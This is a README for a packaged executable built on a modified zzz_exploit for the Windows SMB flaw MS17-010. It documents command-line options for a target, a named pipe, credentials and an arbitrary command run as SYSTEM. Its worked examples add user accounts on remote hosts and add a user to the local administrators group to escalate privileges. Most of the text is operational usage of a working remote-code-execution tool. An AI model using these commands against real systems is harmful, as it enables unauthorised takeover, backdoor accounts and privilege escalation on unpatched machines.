# ms17-010
This is a modified version of the [Worawit Wang: GitHub](https://github.com/worawit/MS17-010/) zzz_exploit for MS17-010.<br>
It implements a few options such as username/password specification and an arbitrary command to be executed.<br>
It does not change anything related to the SMB exploitation<br>
This is a bundle with an executable and dependencies and DOES NOT require python install.<br>
Built with Pyinstaller.

# Usage

Unzip the bundle and from the command line execute ms17-010-zzz.exe<br><br>
ms17-010-zzz.exe -h<br>
usage: ms17-010-zzz.exe [-h] -t TARGET -c COMMAND -P PIPE [-u USER]
                        [-p PASSWORD]
<br><br>
MS17-010 - zzz_explot modified and converted to binary https://github.com/irgoncalves/ms17-010<br>
<br>
optional arguments:<br>
  -h, --help            show this help message and exit<br>
  -t TARGET, --target TARGET<br>
                        Target for exploitation<br>
  -c COMMAND, --command COMMAND<br>
                        Command to be executed as a service<br>
  -P PIPE, --pipe PIPE  Pipe to connect (e.g. netlogon)<br>
  -u USER, --user USER  Username to authenticate in case no anomymous<br>
                        connection to a pipe is allowed<br>
  -p PASSWORD, --password PASSWORD<br>
                        Password for the user<br>
<br>
Example: ms17-010.exe -t 172.16.0.2 -c 'net user /add testusr teste123'<br>
<br>

Example to add a user remotely connecting anonymously to a named pipe:<br>
ms17-010-zzz.exe -t 10.128.1.208 -c "net user /add teste2 teste2123"<br>
<br>
Example to add a user remotely specifying a named pipe and a valid non-administrator user:<br>
ms17-010-zzz.exe -t 10.128.1.208 -c "net user /add teste2 teste2123" -P netlogon -u svruser -p abc123<br>
<br>
Example to locally escalate privilege for an existent user (all commands are executed by SYSTEM):<br>
ms17-010-zzz.exe -t 127.0.0.1 -c "net localgroup administrators teste2 /add" -P netlogon -u teste2 -p teste2123

# Limitations
Currently supports only x64 platform (Tested running from Windows 10, 2K8)
